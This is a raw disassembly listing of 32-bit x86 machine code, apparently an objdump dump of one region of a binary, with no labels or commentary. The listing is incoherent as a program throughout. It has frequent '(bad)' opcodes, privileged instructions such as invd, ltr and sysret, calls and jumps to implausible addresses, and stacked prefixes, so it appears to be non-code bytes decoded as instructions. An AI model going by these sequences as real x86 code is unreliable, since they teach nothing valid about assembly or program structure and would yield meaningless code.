  410259:	rcr    BYTE PTR [esp+eax*4],0x55
  41025d:	add    ah,ch
  41025f:	add    BYTE PTR [edi-0x48fef979],dh
  410265:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41026c:	inc    esp
  41026d:	mov    ebx,DWORD PTR [eax]
  41026f:	fcom   st(2)
  410271:	add    BYTE PTR [edi],bl
  410273:	lea    ecx,[eax-0x18]
  410276:	(bad)  
  410277:	push   DWORD PTR [ecx]
  410279:	call   0xffb34fdb
  41027e:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  410282:	fstp   DWORD PTR [esi+ebx*8]
  410285:	push   ebp
  410286:	pop    ebp
  410287:	mov    esi,DWORD PTR [edx-0x38]
  41028a:	add    DWORD PTR [eax],0x28
  41028d:	mov    edi,DWORD PTR [ebx]
  41028f:	xor    esi,DWORD PTR [edx+0x3]
  410292:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  410296:	pop    ebp
  410297:	or     al,0x4
  410299:	inc    ecx
  41029a:	push   ebp
  41029b:	(bad)  
  41029c:	in     al,dx
  41029d:	or     ah,ch
  41029f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102a0:	xbegin 0xffc67896
  4102a6:	clc    
  4102a7:	adc    al,0x45
  4102a9:	div    BYTE PTR [edx]
  4102ab:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4102b2:	test   DWORD PTR [ebp+0x661b00f8],ebx
  4102b8:	add    BYTE PTR [ecx+0x66],dh
  4102bb:	add    eax,DWORD PTR [ebp+0x52]
  4102be:	adc    eax,0x60
  4102c1:	xchg   DWORD PTR [ecx+0x3400fc01],ecx
  4102c7:	test   DWORD PTR [eax],eax
  4102c9:	clc    
  4102ca:	data16 or al,BYTE PTR [ebp+0x45]
  4102ce:	or     DWORD PTR [ebx-0x3d76d720],0xfffffff8
  4102d5:	rol    BYTE PTR [ebp+0x45],1
  4102d8:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4102de:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4102e4:	push   ebx
  4102e5:	add    BYTE PTR [esi+0x0],dl
  4102e8:	push   ecx
  4102e9:	jge    0x41031e
  4102eb:	add    BYTE PTR [esi+0x4],dl
  4102ee:	jne    0x410355
  4102f0:	mov    edx,0x457200
  4102f5:	jmp    0x4102b9
  4102f7:	xor    edi,DWORD PTR [ebx]
  4102f9:	pop    edi
  4102fa:	cvtdq2ps xmm7,xmm0
  4102fd:	ret    0x0
  410300:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  410306:	xor    ecx,DWORD PTR [edi]
  410308:	add    eax,DWORD PTR [ecx+0x3b]
  41030b:	push   ebx
  41030c:	rdpmc  
  41030e:	out    0x8d,al
  410310:	add    BYTE PTR [eax],cl
  410312:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  410318:	ret    0x450c
  41031b:	sbb    al,0x8b
  41031d:	cmp    eax,esi
  41031f:	or     cl,al
  410321:	or     al,0xc2
  410323:	pop    eax
  410324:	inc    ebp
  410325:	add    ecx,DWORD PTR [edi]
  410327:	add    esi,DWORD PTR [ebp+0x39]
  41032a:	invd   
  41032c:	jge    0x410338
  41032e:	mov    eax,0x478ac0
  410333:	cli    
  410334:	xor    esp,ecx
  410336:	mov    ebx,0x5b8ac0
  41033b:	ret    0x33
  41033e:	mov    eax,0x833b8b
  410343:	sub    BYTE PTR [ebx],al
  410345:	inc    ebp
  410346:	xor    ax,0x9cf8
  41034a:	inc    bh
  41034c:	mov    esp,esp
  41034e:	hlt    
  41034f:	test   DWORD PTR [ebp-0x8],esi
  410352:	mov    eax,DWORD PTR [ebp-0x14]
  410355:	xor    ecx,DWORD PTR [ebx-0x76478864]
  41035b:	dec    edi
  41035c:	or     BYTE PTR [eax],al
  41035e:	jne    0x4102e9
  410360:	mov    esi,esp
  410362:	call   0x77a78f27
  410367:	inc    ebp
  410368:	mov    DWORD PTR [eax+0x9d4f0c],edi
  41036e:	add    BYTE PTR [ecx-0x3ffe0717],cl
  410374:	add    BYTE PTR [esi+0x7d],ah
  410377:	inc    ebp
  410378:	mov    bx,WORD PTR [ebp+0x8]
  41037c:	add    DWORD PTR [ebp+0x56],0x30c008b
  410383:	inc    ebp
  410384:	mov    bx,di
  410387:	lock test BYTE PTR [ecx+0x7000801],bh
  41038e:	jge    0x410351
  410390:	mov    ecx,DWORD PTR [ebx-0x620613f0]
  410396:	cli    
  410397:	xor    bl,bh
  410399:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  41039f:	test   BYTE PTR [eax],cl
  4103a1:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  4103a8:	cmp    ebp,eax
  4103aa:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4103b1:	test   BYTE PTR [ebp+0x1],bh
  4103b4:	mov    ebx,0x458a00
  4103b9:	xor    esi,DWORD PTR [ebx]
  4103bb:	add    esp,DWORD PTR [esi-0x77]
  4103be:	pop    ebp
  4103bf:	loopne 0x410427
  4103c1:	inc    ebp
  4103c2:	clc    
  4103c3:	xor    edi,DWORD PTR [ebx]
  4103c5:	add    esi,DWORD PTR [edx-0x77]
  4103c8:	data16 fdivr QWORD PTR [ebp-0x49]
  4103cc:	mov    ebx,0xb78afc
  4103d1:	hlt    
  4103d2:	xor    eax,DWORD PTR [eax+0x66]
  4103d5:	add    BYTE PTR [ebp+0x66],bl
  4103d8:	data16 lock clc 
  4103db:	inc    eax
  4103dc:	cmp    eax,DWORD PTR [eax]
  4103de:	ja     0x410446
  4103e0:	psubq  mm7,QWORD PTR [ebp+0x6]
  4103e4:	ltr    WORD PTR [ebp+0x66]
  4103e8:	add    esi,eax
  4103ea:	add    di,WORD PTR [ebp+0x2b]
  4103ee:	data16 data16 jge 0x41046f
  4103f2:	mov    ebx,0xe08a8b
  4103f7:	jge    0x41042c
  4103f9:	data16 data16 xor al,0x5d
  4103fd:	data16 data16 jne 0x4103f9
  410401:	mov    edi,DWORD PTR [ebx]
  410403:	fdiv   QWORD PTR [edx+0x7d]
  410406:	data16 data16 jge 0x41043e
  41040a:	mov    ebx,0x758a66
  41040f:	mov    esi,0x667233
  410414:	pop    ebp
  410415:	or     BYTE PTR [esi+0x0],ah
  410418:	clc    
  410419:	mov    edi,DWORD PTR [ebx]
  41041b:	lock ja 0x4103a9
  41041e:	(bad)  
  410420:	jge    0x410419
  410422:	invd   
  410424:	pop    ebp
  410425:	add    BYTE PTR [ebx],al
  410427:	(bad)  
  410428:	cmp    di,WORD PTR [ebp+0xf]
  41042c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  410430:	mov    bx,WORD PTR [ebp-0x10]
  410434:	pop    bp
  410436:	fbstp  TBYTE PTR [ebx]
  410438:	test   DWORD PTR [ebx],eax
  41043a:	add    BYTE PTR [ebx],bh
  41043c:	add    BYTE PTR [esi+0x7d],ah
  41043f:	jge    0x4103cc
  410441:	data16 in al,dx
  410443:	pop    ebp
  410444:	stc    
  410445:	bsf    ecx,DWORD PTR [ebp+0x6632009d]
  41044c:	mov    edi,ebx
  41044e:	in     al,dx
  41044f:	test   BYTE PTR [ebp+0x0],bh
  410452:	mov    eax,DWORD PTR [eax]
  410454:	call   0xbd3dfde4
  410459:	inc    eax
  41045a:	popf   
  41045b:	add    BYTE PTR [edx],dh
  41045d:	mov    bx,di
  410460:	call   0x8b4981f0
  410465:	add    ebp,esp
  410467:	mov    bx,di
  41046a:	jnp    0x410492
  41046c:	mov    DWORD PTR [ebx+0x407df808],ecx
  410472:	mov    eax,DWORD PTR [eax]
  410474:	call   0x7c3c8fdf
  410479:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  41047f:	data16 data16 fistp WORD PTR [ebp+0xe]
  410484:	xor    DWORD PTR [edi-0x48fff7aa],0xfb66f403
  41048e:	fisttp WORD PTR [ecx-0x7401f77b]
  410494:	(bad)  
  410495:	cld    
  410496:	jne    0x4104d8
  410498:	xor    eax,DWORD PTR [eax]
  41049a:	mov    esp,DWORD PTR [esi-0x10]
  41049d:	sti    
  41049e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  4104a5:	data16 adc bl,bh
  4104a8:	push   ebp
  4104a9:	xor    ecx,DWORD PTR es:[ebx+0x40e4f88b]
  4104b0:	mov    WORD PTR [eax],es
  4104b2:	popf   
  4104b3:	data16 xor bh,bl
  4104b6:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4104bc:	mov    esp,DWORD PTR [esi-0x14]
  4104bf:	fisttp WORD PTR [ebx-0x3748a9f2]
  4104c5:	or     al,0x2b
  4104c7:	mov    bh,0xba
  4104c9:	hlt    
  4104ca:	mov    bh,bl
  4104cc:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4104d2:	dec    esi
  4104d3:	or     al,0x0
  4104d5:	mov    edi,DWORD PTR [ebx]
  4104d7:	or     BYTE PTR [ebp+0x3b],dh
  4104da:	mov    ecx,DWORD PTR [edi]
  4104dc:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4104e2:	xor    al,0xd8
  4104e4:	pop    bp
  4104e6:	lock xor esi,DWORD PTR [ebx]
  4104e9:	lea    esp,[esi+0x1f]
  4104ec:	icebp  
  4104ed:	jb     0x4104f3
  4104ef:	add    al,al
  4104f1:	jge    0x4104ff
  4104f3:	mov    eax,eax
  4104f5:	fsubr  st,st(3)
  4104f7:	pop    ebp
  4104f8:	mov    esi,DWORD PTR [ebx]
  4104fa:	in     al,0x8d
  4104fc:	rcr    DWORD PTR [edi],0xc2
  4104ff:	jb     0x41055f
  410501:	add    cl,cl
  410503:	jge    0x410511
  410505:	mov    edx,DWORD PTR [ebp-0x20]
  410508:	in     al,dx
  410509:	pop    ebp
  41050a:	data16 data16 or BYTE PTR [esi+edi*4],bh
  41050f:	cmp    di,WORD PTR [ebp+0x0]
  410513:	mov    ebp,DWORD PTR [ebx]
  410515:	fdivr  QWORD PTR [esi+0x668a5d]
  41051b:	cmp    al,0x33
  41051d:	mov    si,0x4e7d
  410521:	mov    eax,DWORD PTR [eax]
  410523:	lock inc ebp
  410525:	mov    esi,DWORD PTR [eax+ecx*1]
  410528:	pushf  
  410529:	idiv   DWORD PTR [edx-0x7ff7af8]
  41052f:	(bad)  
  410530:	cmp    edi,DWORD PTR [ebx]
  410532:	je     0x410543
  410534:	push   ebx
  410535:	loopne 0x410546
  410537:	dec    ecx
  410539:	mov    esp,DWORD PTR [ebx-0x1c]
  41053c:	int    0xf1
  41053e:	mov    esi,0x703084d
  410543:	movlhps xmm6,xmm1
  410546:	add    BYTE PTR [ebp+0x66],dh
  410549:	jmp    0x410516
  41054b:	mov    eax,DWORD PTR [ebx]
  41054d:	lock push ebp
  41054f:	ror    DWORD PTR [ebp-0x2972feb3],1
  410555:	or     bh,dl
  410557:	jb     0x410557
  410559:	add    BYTE PTR [ebx-0x1a7487b3],cl
  41055f:	loopne 0x410561
  410561:	jne    0x410569
  410563:	data16 add BYTE PTR [esi+eiz*2],dh
  410567:	mov    ecx,ebx
  410569:	inc    ax
  41056b:	icebp  
  41056c:	add    BYTE PTR [eax+0x66],al
  41056f:	add    bl,cl
  410571:	mov    dx,0xf2
  410575:	mov    edx,0x66cb0066
  41057a:	enter  0x4df1,0x19
  41057e:	pop    edi
  41057f:	jne    0x410502
  410581:	mov    esi,DWORD PTR [eax+ebp*8]
  410584:	pushf  
  410585:	mov    esi,DWORD PTR [edi+esi*2+0x33]
  410589:	sub    ecx,DWORD PTR [ebp-0x1a0db79a]
  41058f:	cmp    eax,DWORD PTR [eax]
  410591:	jne    0x41055c
  410593:	xor    edx,DWORD PTR [ebp-0x15]
  410596:	in     al,dx
  410597:	xor    edx,DWORD PTR [esi+0x40]
  41059a:	mov    DWORD PTR [edi],0x338545fc
  4105a0:	clc    
  4105a1:	add    esi,DWORD PTR ds:0xe85b9c5f
  4105a7:	ret    0xff
  4105aa:	dec    DWORD PTR [ebx-0x74f8ae08]
  4105b0:	ss push esi
  4105b2:	dec    eax
  4105b3:	push   es
  4105b4:	jle    0x4105b6
  4105b6:	popa   
  4105b7:	data16 (bad) 
  4105b9:	into   
  4105ba:	arpl   WORD PTR [eax-0x33],ax
  4105bd:	add    BYTE PTR [ecx+0x7ce0866],bh
  4105c3:	mov    edx,0xc7000066
  4105c8:	push   es
  4105c9:	cld    
  4105ca:	add    BYTE PTR [ebp+0x35c3f866],al
  4105d0:	inc    eax
  4105d1:	pushf  
  4105d2:	add    BYTE PTR [esi+0x66],ah
  4105d5:	into   
  4105d6:	ret    
  4105d7:	pop    ebp
  4105d8:	push   0x66b70057
  4105dd:	mov    edi,0xff038dc3
  4105e2:	jne    0x41063a
  4105e4:	lea    edx,[ecx+0x1]
  4105e7:	mov    ebx,0xd64ff1
  4105ec:	sar    DWORD PTR [ebx],1
  4105ee:	test   BYTE PTR [ebp+0x3a],dh
  4105f1:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4105f5:	push   edi
  4105f6:	xor    BYTE PTR [ebx],0x36
  4105f9:	mov    esi,ebx
  4105fb:	xor    eax,DWORD PTR [eax-0x3c73819a]
  410601:	cmp    al,BYTE PTR [ebp+0x64]
  410604:	pop    ebx
  410605:	mov    ebx,0x9c3b34
  41060a:	je     0x410637
  41060c:	xor    edi,DWORD PTR [ebx+0x668a33]
  410612:	mov    WORD PTR [ebx],?
  410614:	cmp    bh,BYTE PTR [ebx+0x8b4e64]
  41061a:	pop    edi
  41061b:	cmp    ecx,ecx
  41061d:	jne    0x410674
  41061f:	mov    ebp,esp
  410621:	cld    
  410622:	push   esi
  410623:	pop    ebx
  410624:	inc    ebp
  410625:	stc    
  410626:	xor    al,0x85
  410628:	pushf  
  410629:	clc    
  41062a:	mov    esi,0xf8ce8509
  41062f:	test   dl,dl
  410631:	cmp    al,0xff
  410633:	fs pop si
  410636:	or     bl,al
  410638:	push   es
  410639:	mov    eax,DWORD PTR [eax]
  41063b:	push   ecx
  41063c:	push   di
  41063e:	retf   0x4045
  410641:	xor    al,0x0
  410643:	pushf  
  410644:	mov    si,0x85ca
  410648:	mov    edx,0x665b00f8
  41064d:	dec    edx
  41064f:	mov    edx,DWORD PTR [edi-0x76]
  410652:	push   edi
  410653:	add    al,0xb7
  410655:	xor    al,0xba
  410657:	cmp    al,0x8d
  410659:	je     0x41065a
  41065b:	mov    edx,DWORD PTR [esi-0x46]
  41065e:	push   ecx
  41065f:	lea    edi,[ebx+0x564fff]
  410665:	push   ecx
  410666:	cmp    edx,DWORD PTR [ebx+0x75]
  410669:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  41066f:	add    BYTE PTR [ebx],dh
  410671:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  410677:	add    BYTE PTR [ebx+esi*1+0x4f64bb3a],cl
  41067e:	mov    ebx,0x3b3b00
  410683:	jne    0x4106b0
  410685:	mov    DWORD PTR [ebx+0x728afc],edi
  41068b:	xor    esi,DWORD PTR [ebx]
  41068d:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  410693:	push   edi
  410694:	cmp    esp,ebp
  410696:	jne    0x410698
  410698:	sbb    DWORD PTR [eax],0x8085c3fc
  41069e:	clc    
  41069f:	dec    eax
  4106a0:	pop    ebx
  4106a1:	sti    
  4106a2:	add    eax,0xeb8bc075
  4106a7:	cld    
  4106a8:	xor    edi,DWORD PTR ds:0xf8c3855e
  4106ae:	mov    ecx,DWORD PTR [ecx+edx*2]
  4106b1:	rol    DWORD PTR [ebp-0x37],0xf
  4106b5:	mov    DWORD PTR [eax],ecx
  4106b7:	inc    edi
  4106b8:	(bad)  
  4106b9:	in     eax,0xfa
  4106bb:	add    bh,bh
  4106bd:	(bad)  
  4106be:	mov    esi,0xc38a5e
  4106c3:	mov    esi,DWORD PTR [ebx]
  4106c5:	push   ecx
  4106c6:	mov    edi,0xfc4ec7
  4106cb:	test   DWORD PTR [ebp-0x8],edx
  4106ce:	xor    ax,0x9cc7
  4106d2:	sub    ebp,eax
  4106d4:	inc    ebp
  4106d5:	(bad)  
  4106d6:	sub    edi,edi
  4106d8:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4106de:	inc    ebp
  4106df:	add    BYTE PTR [esi+0x2b],ah
  4106e2:	or     bh,BYTE PTR [edx+0xf8ac2]
  4106e8:	cmp    al,0x33
  4106ea:	mov    edi,DWORD PTR [edx+0xfa4e81]
  4106f0:	(bad)  
  4106f1:	cmp    esi,DWORD PTR [ebx]
  4106f3:	je     0x4106ad
  4106f5:	push   ebx
  4106f6:	dec    esi
  4106f7:	str    ecx
  4106fa:	cmp    esp,DWORD PTR [ebx+0x75]
  4106fd:	int    0x33
  4106ff:	mov    edi,0x789085f
  410704:	mov    ebp,DWORD PTR [eax-0x4]
  410707:	add    cl,cl
  410709:	data16 add al,0xcb
  41070c:	push   ebp
  41070d:	add    ebp,esp
  41070f:	jne    0x4106fd
  410711:	(bad)  
  410712:	mov    DWORD PTR [ecx],0xd685f7ec
  410718:	clc    
  410719:	xlat   BYTE PTR ds:[ebx]
  41071a:	inc    ebp
  41071b:	mov    esi,DWORD PTR [edx]
  41071d:	push   eax
  41071e:	pushf  
  41071f:	in     eax,0x8b
  410721:	add    ah,ch
  410723:	push   es
  410724:	push   esi
  410725:	add    BYTE PTR [ecx+0x66],dl
  410728:	add    eax,0x4072cb
  41072d:	add    BYTE PTR [ebp+0x66],al
  410730:	(bad)  
  410731:	retf   
  410732:	lock mov edx,0x66f80085
  410738:	inc    ebp
  410739:	retf   
  41073a:	xor    eax,ecx
  41073c:	pushf  
  41073d:	jge    0x410706
  41073f:	xor    al,0xfc
  410741:	pushf  
  410742:	test   DWORD PTR [edi-0x8],ebx
  410745:	je     0x41078c
  410747:	xor    esi,DWORD PTR ds:0x7020840
  41074d:	ror    BYTE PTR [ebp-0x37],0x8d
  410751:	push   ebp
  410752:	add    esp,ebp
  410754:	jb     0x4106e1
  410756:	add    BYTE PTR [eax],cl
  410758:	dec    ebp
  410759:	mov    bh,0x81
  41075b:	push   esi
  41075c:	push   esi
  41075d:	adc    DWORD PTR [ecx-0x3c],0x409dff81
  410764:	xor    al,BYTE PTR [eax]
  410766:	mov    edx,DWORD PTR [edi+0x10]
  410769:	(bad)  
  41076a:	scas   eax,DWORD PTR es:[edi]
  41076b:	mov    edx,0x890f003b
  410770:	in     eax,dx
  410771:	cld    
  410772:	add    BYTE PTR [ebx],bh
  410774:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  410778:	dec    ebp
  410779:	or     BYTE PTR [ebx],ch
  41077b:	ret    0x458b
  41077e:	lock jmp 0x410772
  410781:	mov    ecx,DWORD PTR [eax]
  410783:	or     BYTE PTR [edi],al
  410785:	mov    ecx,eax
  410787:	xor    DWORD PTR [edx+0x2],0x0
  41078b:	mov    bh,0xc1
  41078d:	adc    BYTE PTR [eax],dh
  41078f:	iret   
  410790:	inc    ebp
  410791:	mov    DWORD PTR [ebx],0x4dfff8c4
  410797:	inc    BYTE PTR [ebx]
  410799:	mov    edx,0x661100f8
  41079e:	adc    al,bh
  4107a0:	dec    ecx
  4107a1:	fisttp WORD PTR [ecx+0x456604c0]
  4107a7:	add    dh,BYTE PTR ds:0x75e0845
  4107ad:	ret    0x4d
  4107b0:	lea    ecx,[ebx+0x18728301]
  4107b6:	add    BYTE PTR [ebp+0x45],al
  4107b9:	xor    eax,0xc7009ce9
  4107be:	add    al,ch
  4107c0:	inc    ebp
  4107c1:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4107c7:	xor    eax,0x781084d
  4107cc:	push   esi
  4107cd:	popf   
  4107ce:	push   ecx
  4107cf:	xor    al,BYTE PTR [ecx+0x32f89d89]
  4107d5:	inc    ebp
  4107d6:	cmp    edi,DWORD PTR ds:0xc78b9c76
  4107dc:	or     ah,dh
  4107de:	inc    ebp
  4107df:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4107e5:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4107eb:	in     al,dx
  4107ec:	hlt    
  4107ed:	push   esi
  4107ee:	push   esi
  4107ef:	push   ecx
  4107f0:	push   ecx
  4107f1:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4107f7:	popf   
  4107f8:	popf   
  4107f9:	xor    dh,BYTE PTR [edx]
  4107fb:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  410801:	or     BYTE PTR [ebp+0x7],al
  410804:	mov    eax,ecx
  410806:	clc    
  410807:	jb     0x4107ca
  410809:	add    BYTE PTR [ebp+0x55],cl
  41080c:	or     DWORD PTR [edi],0xc251d156
  410812:	add    DWORD PTR [ebx+0x32009d],0x8b76453b
  41081c:	mov    edi,eax
  41081e:	or     cl,al
  410820:	inc    ebp
  410821:	dec    ebp
  410822:	mov    eax,DWORD PTR [ecx+0x514d560c]
  410828:	or     WORD PTR [ecx],0x899d
  41082d:	xor    cl,BYTE PTR [ebx+0x5676fc3b]
  410833:	mov    edx,DWORD PTR [ecx+0x8]
  410836:	mov    eax,DWORD PTR [ebp-0x8]
  410839:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb263]
  410840:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  410846:	inc    ebp
  410847:	dec    eax
  410848:	add    ecx,DWORD PTR [ebx+0x564df0f8]
  41084e:	add    edx,DWORD PTR [ecx-0x8]
  410851:	mov    ecx,DWORD PTR [ecx]
  410853:	clc    
  410854:	or     BYTE PTR [ebp+eax*2+0x4532409d],al
  41085b:	mov    ecx,ebp
  41085d:	clc    
  41085e:	(bad)  
  41085f:	popf   
  410860:	inc    DWORD PTR [eax]
  410862:	ret    0x8b
  410865:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  41086b:	mov    edi,esp
  41086d:	hlt    
  41086e:	test   ecx,esi
  410870:	clc    
  410871:	or     BYTE PTR [ebp+0x7],al
  410874:	xor    al,cl
  410876:	pushf  
  410877:	jb     0x4108ac
  410879:	add    BYTE PTR [eax-0x3f],al
  41087c:	inc    eax
  41087d:	daa    
  41087e:	inc    ebp
  41087f:	inc    ebp
  410880:	xor    eax,0x7f80803
  410885:	dec    ebp
  410886:	popf   
  410887:	add    esi,DWORD PTR [edx]
  410889:	clc    
  41088a:	cmp    DWORD PTR [ecx],ecx
  41088c:	or     al,0x8
  41088e:	add    al,BYTE PTR [ebp+0x2c]
  410891:	xor    eax,0x7350845
  410896:	or     BYTE PTR [ebp+0x7],cl
  410899:	lea    ebx,[ebp-0x748dcdff]
  41089f:	add    BYTE PTR [eax*2-0x74b21438],cl
  4108a6:	mov    edx,DWORD PTR [eax]
  4108a8:	cld    
  4108a9:	dec    ebp
  4108aa:	push   esi
  4108ab:	sub    edx,DWORD PTR [ecx-0x75]
  4108ae:	add    eax,0xf172fc
  4108b3:	or     BYTE PTR [ebp+0x7],cl
  4108b6:	add    eax,ecx
  4108b8:	or     al,0x72
  4108ba:	add    DWORD PTR [eax],eax
  4108bc:	mov    ebx,0x29c2c1
  4108c1:	inc    ebp
  4108c2:	mov    eax,DWORD PTR [ebx]
  4108c4:	cmp    eax,0x3004d1c
  4108ca:	xbegin 0x66c694c4
  4108d0:	clc    
  4108d1:	or     BYTE PTR [ebp+0x45],al
  4108d4:	xor    dh,BYTE PTR ds:0x78b089c
  4108da:	adc    BYTE PTR [ebp+0x45],cl
  4108dd:	lea    eax,[ebp+0x33727501]
  4108e3:	add    cl,ch
  4108e5:	inc    ebp
  4108e6:	add    bl,ch
  4108e8:	add    BYTE PTR [ebx+0x45850845],cl
  4108ee:	je     0x41087b
  4108f0:	push   ebx
  4108f1:	or     al,0x85
  4108f3:	dec    ebp
  4108f4:	std    
  4108f5:	mov    bh,bh
  4108f7:	mov    BYTE PTR [ebp-0x75],al
  4108fa:	mov    edi,eax
  4108fc:	or     al,0x89
  4108fe:	inc    ebp
  4108ff:	clc    
  410900:	mov    esp,esp
  410902:	hlt    
  410903:	call   DWORD PTR [edi-0x37]
  410906:	push   esi
  410907:	or     al,0x51
  410909:	push   ebp
  41090a:	xor    ebp,esp
  41090c:	mov    esi,0x457251
  410911:	xor    eax,0xc7459cc6
  410916:	mov    edi,eax
  410918:	or     al,0x85
  41091a:	add    al,bh
  41091c:	inc    eax
  41091e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  410922:	or     ah,bh
  410924:	inc    eax
  410925:	push   esi
  410926:	jmp    0x410979
  410928:	mov    eax,DWORD PTR ds:0xe8720c
  41092e:	mov    DWORD PTR [ebp-0x8],eax
  410931:	jne    0x410978
  410933:	jmp    0x4108c0
  410935:	mov    ebp,DWORD PTR [eax]
  410937:	clc    
  410938:	retf   0xff56
  41093b:	push   ecx
  41093c:	mov    DWORD PTR ds:0x757210,eax
  410942:	mov    ecx,DWORD PTR [ebp-0x4]
  410945:	sub    esp,DWORD PTR [ebx-0x77]
  410948:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41094f:	or     ah,bh
  410951:	pop    es
  410952:	ds popf 
  410954:	push   DWORD PTR [edx]
  410956:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41095c:	(bad)  
  41095d:	mov    bh,bh
  41095f:	jmp    0x41094d
  410961:	leave  
  410962:	jne    0x41096c
  410964:	call   0x2e02be
  410969:	in     al,dx
  41096a:	dec    ebp
  41096b:	add    dh,BYTE PTR [ebx]
  41096d:	add    BYTE PTR [ebx],al
  41096f:	inc    ebp
  410970:	cmp    esi,DWORD PTR ds:0xc78b9c74
  410976:	or     al,0xf0
  410978:	add    BYTE PTR [ebp+0x458bf845],al
  41097e:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  410984:	adc    al,0x7
  410986:	enter  0x9fc0,0xa5
  41098a:	rol    BYTE PTR [eax],0x5e
  41098d:	mov    ecx,ecx
  41098f:	or     al,0xc
  410991:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  410998:	jmp    0x410999
  41099a:	push   ebp
  41099b:	mov    esp,ebp
  41099d:	cld    
  41099e:	inc    ebp
  41099f:	inc    ebp
  4109a0:	or     DWORD PTR [ecx+0x457dec10],0x0
  4109a7:	push   esi
  4109a8:	push   esi
  4109a9:	mov    edi,0x7af080f
  4109ae:	add    bh,al
  4109b0:	test   DWORD PTR [ebp+0x3a7320f],ebx
  4109b6:	add    BYTE PTR [ecx+0x4540100f],cl
  4109bc:	mov    ebp,eax
  4109be:	mov    ebp,edi
  4109c0:	lock call edx
  4109c3:	fcom   DWORD PTR [ebp+0x45]
  4109c6:	mov    eax,0x148a8b
  4109cb:	push   ecx
  4109cc:	enter  0xc145,0x83
  4109d0:	cmp    ecx,DWORD PTR [eax]
  4109d2:	add    BYTE PTR [ebp+0x4d],al
  4109d5:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  4109db:	call   0xffa1054a
  4109e0:	cmp    eax,DWORD PTR [ebp-0xc]
  4109e3:	jmp    DWORD PTR [eax+edx*1-0x4e]
  4109e7:	push   ebp
  4109e8:	(bad)  
  4109e9:	call   0x3207ed
  4109ee:	mov    bh,0xdb
  4109f0:	cld    
  4109f1:	or     BYTE PTR [ebp+0x45],bl
  4109f4:	(bad)  
  4109f5:	call   0xff7b0685
  4109fa:	add    al,BYTE PTR [ebp+0x37]
  4109fd:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  410a03:	jne    0x410a05
  410a05:	(bad)  
  410a06:	cmp    edi,esp
  410a08:	jne    0x410a3b
  410a0a:	mov    edi,edi
  410a0c:	or     BYTE PTR [ebx-0x307f0b49],cl
  410a12:	pop    ds
  410a13:	into   
  410a14:	je     0x4109d7
  410a16:	mov    ebx,DWORD PTR [esi]
  410a18:	or     BYTE PTR [ebp-0x49],al
  410a1b:	mov    esp,DWORD PTR [esi-0x77]
  410a1e:	mov    esi,0x6451f0c
  410a23:	mov    eax,DWORD PTR [eax]
  410a25:	or     al,0x66
  410a27:	sar    bl,0x3b
  410a2a:	xor    esi,DWORD PTR [ebp+0x66]
  410a2d:	xor    ecx,edi
  410a2f:	pop    edi
  410a30:	adc    bl,BYTE PTR [ebx+0x7e]
  410a33:	ret    0xff
  410a36:	cld    
  410a37:	inc    ebp
  410a38:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  410a3e:	cld    
  410a3f:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  410a46:	push   0xffffff83
  410a48:	pop    edi
  410a49:	or     BYTE PTR [ebp+0x53],dh
  410a4c:	xorps  xmm1,xmm2
  410a4f:	test   BYTE PTR [eax+eax*1],bh
  410a52:	add    BYTE PTR [eax],al
  410a54:	adc    eax,eax
  410a56:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  410a5e:	jmp    DWORD PTR [eax]
  410a60:	ror    al,0x5e
  410a63:	inc    ebp
  410a64:	leave  
  410a65:	xor    ecx,DWORD PTR [eax]
  410a67:	and    DWORD PTR [ebx-0x3ebf0708],ecx
  410a6d:	add    ah,al
  410a6f:	xor    edi,edi
  410a71:	xor    DWORD PTR [ebx],0x66003306
  410a77:	mov    DWORD PTR [ebp-0xc],ecx
  410a7a:	pcmpgtw mm0,mm0
  410a7d:	add    dl,ah
  410a7f:	leave  
  410a80:	mov    esi,DWORD PTR [eax-0x7d]
  410a83:	push   ax
  410a85:	dec    ebp
  410a86:	mov    esi,DWORD PTR [ebx-0x75]
  410a89:	lea    ebp,[eax-0x7c00ff06]
  410a8f:	xor    eax,DWORD PTR [eax]
  410a91:	sysret 
  410a93:	dec    ebp
  410a94:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  410a9b:	push   WORD PTR [ecx+0x8]
  410a9f:	jne    0x410a62
  410aa1:	ud0    ecx,DWORD PTR [ecx]
  410aa4:	mov    edi,DWORD PTR [edx+0x660000ac]
  410aaa:	(bad)  
  410aab:	iret   
